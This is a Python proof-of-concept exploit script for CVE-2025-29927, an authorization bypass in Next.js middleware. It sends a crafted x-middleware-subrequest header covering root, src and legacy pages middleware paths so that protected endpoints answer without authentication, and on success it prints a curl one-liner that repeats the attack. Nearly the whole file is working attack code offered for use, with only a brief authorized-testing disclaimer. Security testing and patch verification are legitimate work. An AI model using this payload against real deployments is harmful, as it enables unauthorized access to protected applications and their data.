#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Next.js Middleware Authorization Bypass (Universal Payload)
# CVE            : CVE-2025-29927
# Vendor         : Vercel
# Product        : Next.js
# Affected       : 11.1.4 – 12.3.4, 13.0.0 – 13.5.8, 14.0.0 – 14.2.24, 15.0.0 – 15.2.2
# Type           : CWE-285 - Improper Authorization
# CVSS           : 9.1 (Critical)
# Platform       : Any (Node.js)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-03-21
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-29927 — Universal Middleware Bypass (Vector 2)

Uses a universal payload covering ALL possible middleware file locations:
root middleware (v13+), src/middleware (v13+), and pages/_middleware (v11-12).
The recursion counter only counts exact matches, so extra entries are harmless.

ATTACK CHAIN:
  1. Send baseline unauthenticated request to protected endpoint
  2. Send request with universal bypass header covering all middleware paths
  3. Middleware is skipped — protected content returned without authentication

PREREQUISITES:
  - Target running vulnerable Next.js (11.1.4 – 15.2.2) with middleware
  - Network access to the target

REFERENCES:
  - CVE-2025-29927
  - https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
"""

import sys
import json
import http.client
import socket

class C:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

# Universal payload covering all middleware locations across all versions
# - "middleware" x5 covers standard root middleware (v13+)
# - "src/middleware" x5 covers src/ directory middleware (v13+)
# - "pages/_middleware" covers legacy pages middleware (v11-12)
UNIVERSAL_BYPASS = (
    "middleware:middleware:middleware:middleware:middleware:"
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware:"
    "pages/_middleware"
)

DEFAULT_HOST = "172.19.0.4"
DEFAULT_PORT = 3000
DEFAULT_PATH = "/api/protected"


def make_request(host, port, path, headers=None, timeout=10):
    """Make an HTTP GET request using stdlib http.client."""
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        all_headers = {"User-Agent": "CVE-2025-29927-PoC-Vector2/1.0"}
        if headers:
            all_headers.update(headers)
        conn.request("GET", path, headers=all_headers)
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", errors="replace")
        status = resp.status
        conn.close()
        return status, body
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        print(f"  {C.RED}[ERROR] {e}{C.RESET}")
        return None, None


def exploit(host, port, path):
    """
    Test the UNIVERSAL bypass payload that covers all middleware locations.
    """
    target = f"http://{host}:{port}{path}"

    print(f"\n{C.BOLD}{'='*70}{C.RESET}")
    print(f"{C.BOLD} CVE-2025-29927 — Vector 2: Universal Middleware Bypass{C.RESET}")
    print(f"{C.BOLD}{'='*70}{C.RESET}")
    print(f"\n  Target: {C.YELLOW}{target}{C.RESET}")
    print(f"  Payload: x-middleware-subrequest: {UNIVERSAL_BYPASS}")
    print(f"  Strategy: Single header covers root, src/, and pages/ middleware paths")

    # Baseline
    print(f"\n{C.BOLD}[Step 1] Baseline request{C.RESET}")
    baseline_status, baseline_body = make_request(host, port, path)
    if baseline_status is None:
        print(f"  {C.RED}[FAIL] Cannot reach target{C.RESET}")
        return False
    print(f"  Status: {baseline_status}")

    # Universal exploit
    print(f"\n{C.BOLD}[Step 2] Universal bypass payload{C.RESET}")
    exploit_status, exploit_body = make_request(
        host, port, path,
        headers={"x-middleware-subrequest": UNIVERSAL_BYPASS}
    )
    if exploit_status is None:
        print(f"  {C.RED}[FAIL] Exploit request failed{C.RESET}")
        return False
    print(f"  Status: {exploit_status}")

    try:
        parsed = json.loads(exploit_body)
        print(f"  Body: {json.dumps(parsed, indent=2)}")
    except (json.JSONDecodeError, TypeError):
        print(f"  Body: {exploit_body[:200]}")

    # Evaluate
    bypass = baseline_status in (401, 403, 302, 307) and exploit_status == 200

    print(f"\n{C.BOLD}{'='*70}{C.RESET}")
    if bypass:
        print(f"  {C.GREEN}{C.BOLD}[VULNERABLE] Universal bypass SUCCEEDED{C.RESET}")
        print(f'  curl -H "x-middleware-subrequest: {UNIVERSAL_BYPASS}" {target}')
    else:
        print(f"  {C.RED}[RESULT] Universal bypass did not change the response.{C.RESET}")
    print(f"{C.BOLD}{'='*70}{C.RESET}\n")

    return bypass


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    path = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_PATH
    success = exploit(host, port, path)
    sys.exit(0 if success else 1)
